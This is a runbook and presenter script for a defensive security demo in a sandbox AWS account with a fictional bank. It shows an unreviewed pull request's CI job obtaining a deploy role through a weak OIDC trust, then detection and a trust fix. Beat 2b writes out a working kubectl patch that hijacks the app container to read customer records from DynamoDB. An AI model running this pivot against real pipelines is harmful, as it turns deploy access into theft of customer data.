# Mybank D2 demo

Everything here is a **fictional bank with invented records in our own AWS sandbox** (`us-east-1`, N. Virginia). The story: a stolen AI-coding-agent token opens an unreviewed pull request; the PR's automated tests run the attacker's code and obtain the AWS identity that deploys the bank. You show the legitimate pipeline working, the attacker reaching synthetic customer data, then the detection catching it and a trust change preventing it.

This one file is both the setup runbook and the presenter walkthrough. Read it top to bottom once; on the day you only need **Part C**.

## What the audience sees

| Beat | What happens | Proof on screen |
| --- | --- | --- |
| 1. Legitimate change | A reviewed PR goes green and deploys through the trusted pipeline | GitHub PR checks green; release run; new text live on `/health` |
| 2. The attack | An unreviewed PR's test job obtains the deploy-capable identity | PR check output: identity obtained |
| 2b. Impact | Using that identity, the attacker replaces the app and reads customer records | Pod logs: `acct-alice` / `acct-bob` and customer JSON |
| 3. Detection + prevention | The monitor alerts; trust is restricted to `main`; the retry is refused | `pr_role_misuse` alert; then `AccessDenied` / `assumption_denied` |
| 4. Evidence | The alert and the AWS record, from outside the attacker's control | monitor terminal, or CloudTrail event history |

```text
Legitimate:  main ──► build role ──► ECR ──► deploy role ──► private runner (in VPC) ──► EKS ──► app ──► DynamoDB
Operator:    laptop ──► SSM (IAM, logged, no inbound ports) ──► private EKS API ──► port-forward ──► app (API key)
Attack:      stolen token ──► PR ──► hosted runner ──► deploy identity ──┬─► replace app ──► app identity ──► customer data
                                                                        └─► CloudTrail ──► independent monitor ──► ALERT
```

> **The one honest framing to say out loud.** The attack's pivot is that an **unreviewed PR obtains the identity trusted to deploy the app**. From there the attacker replaces the app and inherits its data access — Beat 2b shows real synthetic records coming out. The detection fires at the **credential grab**, the earliest link, which is why that is the moment to catch. Honest caveat worth stating: a GitHub-hosted PR runner can't reach the private cluster, so the post-grab steps (2b) run from an in-VPC position — representing an attacker whose pipeline deploys with cluster access, a common real pattern.

---

## Part A — Stand it up (~20–25 min, unattended)

All commands run from the repository root in PowerShell.

1. Sign the local CLI in as your console user (browser approval, no access keys):

   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.login     # approve as demo-admin
   ```

2. Build everything:

   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.up
   ```

   Review the Terraform summary, type `y`. Seven stages print `[ok]`: Terraform (private EKS, DynamoDB, IAM, ops host) → GitHub wiring (no secrets) → image to private ECR → private release runner → app bootstrap → synthetic data → one trusted `main` release. Every stage is idempotent; if one fails, fix it and run `up` again.

3. (Optional) Look around the AWS console, region **N. Virginia**:
   - **EKS → `mybank-sandbox` → Resources → Workloads** (`mybank` namespace): the `mybank-api` pods. Networking shows the API endpoint is private only.
   - **DynamoDB → `mybank-sandbox-accounts` → Explore items**: `acct-alice`, `acct-bob`.
   - **ECR → `mybank-sandbox/api`**: the published image.
   - **IAM → Roles**: `mybank-sandbox-deploy` (`main` only) and `mybank-sandbox-d2-demo-deploy` (the exercise role the attack targets).

---

## Part B — Prepare to present (just before the panel)

Open **two terminals** at the repo root and **one GitHub tab** on the repo. (Optionally one AWS console tab as `demo-admin` in N. Virginia for Beat 4.)

**Terminal 1 — the private app access.** Sets up the SSM tunnel and kubectl, used in Beat 1 and 2b. Leave it open.

```powershell
. ./scripts/aws/session.ps1
$o = Get-Content .cache/outputs.json -Raw | ConvertFrom-Json
Start-Process -FilePath (Get-Command aws).Source -ArgumentList @('ssm','start-session','--target',$o.operations_instance_id.value,'--document-name','AWS-StartPortForwardingSessionToRemoteHost','--parameters',"host=$($o.cluster_endpoint_hostname.value),portNumber=443,localPortNumber=8443") -WindowStyle Hidden
Start-Sleep 8
$env:KUBECONFIG = "$PWD\.cache\kubeconfig"
aws eks update-kubeconfig --name mybank-sandbox --role-arn arn:aws:iam::404824402451:role/mybank-sandbox-bootstrap --alias mybank | Out-Null
kubectl config set-cluster arn:aws:eks:us-east-1:404824402451:cluster/mybank-sandbox --server=https://127.0.0.1:8443 --tls-server-name=$($o.cluster_endpoint_hostname.value) | Out-Null
$key = Get-Content .cache/demo-api-key
Start-Process kubectl -ArgumentList '-n','mybank','port-forward','service/mybank-api','8080:8000' -WindowStyle Hidden
```

**Terminal 2 — security's monitor.** Start it and minimize it; you glance at it in Beat 3/4.

```powershell
.venv/Scripts/python.exe -m scripts.demo.watch --minutes 120
```

**Confirm detection mode is on** (the deliberately weak trust that lets the attack succeed first):

```powershell
.venv/Scripts/python.exe -m scripts.demo.prevent off
```

---

## Part C — Run the demo (~10 min)

### Beat 1 — the legitimate change (~40s, one GitHub tab)

1. GitHub → **Code** → `app/release.py` → **pencil / Edit**.
2. Change the text: `RELEASE_NOTE = "hello from the panel"`.
3. **Commit changes** → **Create a new branch** → **Propose changes** → **Create pull request**.
4. **Checks** tab: the PR checks run and go **green**.

Say: *"Normal change. CI ran on GitHub's own machines with no access to AWS. A reviewer approves and merges, and only then does it deploy."* Merge it for the green-tick moment if you like (not required).

### Beat 2 — the attacker obtains the keys (~2 min)

Say: *"Now I'm the attacker. I phished a junior dev's AI coding-agent token. I can't merge anything, but I can open a PR — and PR tests run before anyone reviews them."*

1. GitHub → **Code** → `scripts/d2/demo_probe.py` → **Edit** → change `MARKER = "..."` to `MARKER = "owned"`. Say: *"This stands in for a build/test script; I'm editing it so my code runs in CI."*
2. **Commit changes** → **Create a new branch** → **Create pull request**. **Do not merge.**
3. **Checks** → **D2 identity-boundary exercise / identity-probe** → the probe step. Read the JSON:
   - `obtained_identity: …mybank-sandbox-d2-demo-deploy/…` — **the unreviewed PR obtained the deployment identity.**
   - `direct_database_read: blocked by IAM`, `reach_private_cluster: blocked by network` — the identity *alone* can't read data or reach the cluster from a hosted runner. The real path is to use it to replace the app, next.

Say: *"A PR nobody approved now holds the identity trusted to deploy our banking backend."*

### Beat 2b — ride that identity to customer data (~2 min, Terminal 1)

The deploy identity can only `patch` the app's Deployment — but the app's pods run under a service account whose Pod Identity role can read the customer tables. Replacing the app's container turns deploy access into data access (the concept's steps 22–24). All synthetic, in our sandbox.

1. Show the identity's exact scope — it can deploy, but can't read the API secret:

   ```powershell
   kubectl auth can-i patch deployment/mybank-api -n mybank --as mybank-deployer --as-group mybank:deployers   # yes
   kubectl auth can-i get secret/mybank-api    -n mybank --as mybank-deployer --as-group mybank:deployers        # no
   ```

2. Acting only as that identity, replace the app container with one that reads the customer records:

   ```powershell
   @'
   {"spec":{"template":{"spec":{"containers":[{"name":"api","command":["sh","-c","python -c 'import boto3,os,json; c=boto3.client(\"dynamodb\",region_name=os.environ.get(\"AWS_REGION\",\"us-east-1\")); print(\"SYNTHETIC CUSTOMER RECORDS:\"); [print(json.dumps(c.get_item(TableName=os.environ[\"ACCOUNTS_TABLE\"],Key={\"account_id\":{\"S\":a}}).get(\"Item\"))) for a in (\"acct-alice\",\"acct-bob\")]; [print(json.dumps(c.get_item(TableName=os.environ[\"CUSTOMERS_TABLE\"],Key={\"customer_id\":{\"S\":u}}).get(\"Item\"))) for u in (\"cust-alice\",\"cust-bob\")]'; sleep 3600"],"livenessProbe":null,"readinessProbe":null,"startupProbe":null}]}}}}
   '@ | Set-Content -Encoding utf8 .cache/hijack-patch.json

   kubectl -n mybank --as mybank-deployer --as-group mybank:deployers `
     patch deployment mybank-api --type strategic --patch-file .cache/hijack-patch.json
   ```

3. The hijacked pod runs under the app identity and prints the records it read:

   ```powershell
   Start-Sleep 25
   kubectl -n mybank logs -l app.kubernetes.io/name=mybank-api --tail=20
   ```

   Expected: `SYNTHETIC CUSTOMER RECORDS:` then `acct-alice` / `acct-bob` and the two customer records (names, emails, balances).

   Say: *"Deploy access became customer-data access. In a real org whose pipeline deploys with cluster reach, this whole chain runs from CI. That's why obtaining the identity is the moment to catch."*

4. Restore the app (as the operator):

   ```powershell
   kubectl -n mybank rollout undo deployment/mybank-api
   kubectl -n mybank rollout status deployment/mybank-api
   ```

   If anything looks off, `.venv/Scripts/python.exe -m scripts.demo.up` re-applies the good Deployment.

> Shortcut: `.venv/Scripts/python.exe -m scripts.demo.impact` runs steps 1–4 automatically. The manual commands above are the reliable fallback; rehearse one of them before the panel.

### Beat 3 — detect, then prevent (~1 min)

1. The monitor (Terminal 2) already printed, during Beat 2: `pull_request run <N> -> pr_role_misuse` and `ALERT (high): Deployment credentials issued to PR validation`. Point at it.

   Say: *"This runs outside GitHub, so the attacker can't silence it. It flagged the grab within about a minute, using AWS's signed record and GitHub's own run record — never the attacker-chosen session name."*

2. Turn on the control and attack again:

   ```powershell
   .venv/Scripts/python.exe -m scripts.demo.prevent on
   ```

   Then GitHub → the attacker PR's branch → edit `scripts/d2/demo_probe.py` again (`MARKER = "owned-again"`) → **Commit directly to the branch**.
3. **Checks** → `identity-probe` now **fails**: `AccessDenied … Not authorized to perform sts:AssumeRoleWithWebIdentity`. The monitor prints `assumption_denied`.

Say: *"One infrastructure-as-code change — the deploy role now trusts only `main`, never PR jobs — and AWS refuses the same attack. Legitimate `main` releases still work."*

### Beat 4 — the evidence (~1 min, optional console)

CloudTrail → **Event history** → filter *Event name* = `AssumeRoleWithWebIdentity`. The successful event (resource `mybank-sandbox-d2-demo-deploy`) is the attack; the newest shows **error `AccessDenied`**, the blocked retry. That's the same story at the source.

**Demo over.** Reset for another run: `.venv/Scripts/python.exe -m scripts.demo.prevent off`, and close the attacker PR without merging.

---

## Part D — Tear it down

```powershell
.venv/Scripts/python.exe -m scripts.demo.down
```

Stops deployments, removes the runner registration, closes demo PRs without merging, destroys the lab, and verifies no EKS cluster, instance, NAT gateway or elastic IP remains. The Terraform state bucket, bootstrap role and budget alert are kept on purpose. At ~USD 0.35/hour you can also just leave it up between rehearsals.

---

## If something goes wrong

| Symptom | Fix |
| --- | --- |
| `ProfileNotFound`, `ExpiredToken`, sign-in error | `.venv/Scripts/python.exe -m scripts.demo.login`, then re-run `. ./scripts/aws/session.ps1` in Terminal 1 |
| `Local port 8443 is busy` | A tunnel is already open; close the other window, or `taskkill /F /IM session-manager-plugin.exe`, and redo Terminal 1 |
| `curl`/kubectl hangs in Terminal 1 | The SSM tunnel timed out; re-run the `aws ssm start-session` and `port-forward` lines |
| Monitor silent after Beat 2 | CloudTrail takes a minute or two; wait, or show Event history directly |
| `prevent on` then attack still succeeds | IAM needs ~30s to propagate; push the retry commit a moment later |
| PR check didn't start | The PR must change `scripts/d2/demo_probe.py` from a branch in this repo |
| `up` stops at a stage | Read the message, fix, re-run `up` (each stage is idempotent) |
| EKS console can't show workloads | Sign in as `demo-admin`, not root |

## Likely questions

| Question | Answer |
| --- | --- |
| Did the attacker get customer data? | Yes — Beat 2b shows synthetic records coming out, by using the deploy identity to replace the app and inherit its data access. The detection fires at the credential grab, before that stage. |
| Could they hide by naming the session "release"? | No. The monitor uses GitHub's signed subject and run record, never the attacker-chosen session name. |
| Why detect if the trust change prevents it? | Defense in depth, and the detector found the gap in the first place. Networks and configs drift; the alert is the early warning. |
| Real-world fix? | Trust deploy roles only from protected `main` (shown live); better, GitOps so CI holds no deploy creds; and scan Terraform for trust policies that admit `pull_request`. |

Recorded results: [docs/d2/evidence.md](docs/d2/evidence.md). Detection logic: [scripts/d2](scripts/d2/README.md). Infrastructure: [infra](infra/README.md).
